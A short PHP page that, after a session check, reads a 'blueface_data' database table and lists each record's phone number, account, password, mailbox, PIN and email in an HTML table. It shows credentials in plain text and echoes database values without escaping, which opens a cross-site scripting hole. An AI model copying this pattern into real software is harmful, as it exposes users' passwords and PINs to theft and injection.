<?php
require ("main.php");	
if(check_session() == 0){

}else{
        exit("You must be logged in to view this page");
}

$result = consult_db("blueface_data", "*");
?>
	<div class="container" align="center">
	<table id="table" class="table table-striped" class='tablesorter'>
            <thead>
              <tr> <th>Phone number</th><th>Account</th><th>Password</th><th>Mailbox</th><th>Pin</th><th>Email</th></tr>
            </thead>

             <?php
		for($a=0; $a < count($result); $a++)
		{
			echo "</tr><td>". $result[$a]['pnumber'] ."</td>";
			echo "<td>". $result[$a]['account'] ."</td>";
			echo "<td>". $result[$a]['password'] ."</td>";
			echo "<td>". $result[$a]['mailbox'] ."</td>";
			echo "<td>". $result[$a]['pin'] ."</td>";
			echo "<td>". $result[$a]['mail'] ."</td></tr>";
		}
            ?>
	  </table></div>
